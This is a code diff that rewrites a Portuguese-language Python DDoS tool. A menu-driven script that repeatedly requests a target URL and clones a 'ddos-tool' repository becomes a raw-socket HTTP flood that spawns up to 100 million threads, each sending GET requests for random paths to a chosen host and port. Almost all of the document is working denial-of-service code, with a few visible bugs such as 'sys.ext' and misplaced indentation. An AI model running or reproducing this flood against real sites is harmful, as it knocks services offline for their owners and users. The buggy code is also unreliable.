@@ -1,100 +1,90 @@
-#!/usr/bin/python3
-import requests
-import threading
-import argparse
-import os
-import subprocess
-import curses
 import random
+import socket
+import string
+import sys
+import threading
 import time
 
-TARGET = ""
+#inputs 
+host = ""
+ip = ""
+porta = 0
+requisições = 0
 
-LOGO = """
-\033[92m ######   ####    ######   #### 
-     ##  #    #       ##  #    #
-     ##  #    #       ##  #    #
- #   ##  #    #  #    ##  #    #   
-  ####    ####    #####    ####  
-\033[0m"""
-
-def attack(target):
-    while True:
-        try:
-            response = requests.get(target)
-            print("\033[92mRequest sent to:\033[0m", target)
-        except Exception as e:
-            print("\033[91mFailed to send request:\033[0m", e)
-        time.sleep(random.uniform(0.5, 2.0))
-
-def clone_repository(stdscr):
-    stdscr.clear()
-    height, width = stdscr.getmaxyx()
-    stdscr.addstr(0, (width // 2) - 15, "\033[92mClonando repositório...\033[0m")
-    stdscr.refresh()
+if len(sys.argv) == 2:
+    porta = 80
+    requisições = 100000000
+elif len(sys.argv) == 3:
+    porta = int(sys.argv[2])
+    requisições = 100000000
+elif len(sys.argv) == 4:
+    porta = int(sys.argv[2])
+    requisições = int(sys.argv[3])
+else:
+    print (f"ERRO\n Usage: {sys.argv[0]} < Hostname > < Porta > < Numero_de_ataques >")
+    sys.ext(1)
     
-    subprocess.run(["git", "clone", "--force", "https://github.com/JOJOofSouls/ddos-tool.git"])
-    
-    stdscr.addstr(2, (width // 2) - 15, "\033[92mRepositório clonado com sucesso!\033[0m")
-    stdscr.addstr(3, (width // 2) - 15, "\033[92mPressione qualquer tecla para continuar...\033[0m")
-    stdscr.getch()
+#converter dominio para IP
+try:
+    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
+    ip = socket.gethostbyname(host)
+except socket.gaierror:
+    print ("ERRO\n Verifique se colocou a URL correta")
+    sys.ext(2)
 
-def main(stdscr):
-    global TARGET
-    stdscr.clear()
-    height, width = stdscr.getmaxyx()
-    stdscr.addstr(0, (width // 2) - len(LOGO.split("\n")[0]) // 2, LOGO)
-    stdscr.addstr(height - 3, 0, "Use as setas para navegar e pressione Enter para selecionar uma opção")
-    stdscr.refresh()
+#criar um compartilhamento de variaveis
+thread_num = 0
+thread_num_mutex = threading.Lock()
 
-    options = [
-        ("Iniciar Ataque", "a"),
-        ("Clonar Repositório", "c"),
-        ("Instalar Dependências", "i"),
-        ("Sair", "q")
-    ]
-    current_option = 0
+#print dos thread
+def print_status():
+    global thread_num
+    thread_num_mutex.acquire(True)
 
-    while True:
-        stdscr.clear()
-        stdscr.addstr(0, (width // 2) - len(LOGO.split("\n")[0]) // 2, LOGO)
-        for idx, option in enumerate(options):
-            x = width // 2 - len(option[0]) // 2
-            y = height // 2 - len(options) // 2 + idx
-            if idx == current_option:
-                stdscr.attron(curses.A_REVERSE)
-                stdscr.addstr(y, x, option[0])
-                stdscr.attroff(curses.A_REVERSE)
-            else:
-                stdscr.addstr(y, x, option[0])
-        stdscr.refresh()
+    thread_num += 1
+    #output
 
-        key = stdscr.getch()
+sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Se segure #-#-#")
+sys.stdout.flush()
+thread_num_mutex.release()
 
-        if key == curses.KEY_UP and current_option > 0:
-            current_option -= 1
-        elif key == curses.KEY_DOWN and current_option < len(options) - 1:
-            current_option += 1
-        elif key == curses.KEY_ENTER or key in [10, 13]:
-            if options[current_option][1] == "a":
-                TARGET = input("Coloque o site: ")
-                attack_thread = threading.Thread(target=attack, args=(TARGET,))
-                attack_thread.start()
-            elif options[current_option][1] == "c":
-                clone_repository(stdscr)
-            elif options[current_option][1] == "i":
-                pass
-            elif options[current_option][1] == "q":
-                break
+#Gerando url path
+def generate_url_path():
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
+    data = "".join(random.sample(msg, 5))
+    return data
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Ferramenta de DDoS")
-    parser.add_argument("--target", type=str, help="URL do alvo")
-    args = parser.parse_args()
+#Realizar requisições
+def attack():
+    print_status()
+    url_path = generate_url_path()
 
-    if args.target:
-        TARGET = args.target
-        attack_thread = threading.Thread(target=attack, args=(TARGET,))
-        attack_thread.start()
-    else:
-        curses.wrapper(main)
+    #criando raw socket
+    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        dos.connect((ip, porta))
+        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+        dos.send(byt)
+    except socket.error:
+        print (f"\n [Sem conexão ]: {str(socket.error)}")
+    finally:
+        dos.shutdown(socket.SHUT_RDWR)
+        dos.close()
+
+
+print (f"[#] Ataque iniciado {host} ({ip} ) || Porta: {str(porta)} || #Requisições: {str(requisições)}")
+
+#spaw thread por requisições feitas
+all_threads = []
+for i in range(requisições):
+    t1 = threading.Thread(target=attack)
+    t1.start()
+    all_threads.append(t1)
+
+    time.sleep(0.01)
+
+for current_thread in all_threads:
+    current_thread.join()
+
+    print("Todas as threads concluíram.")
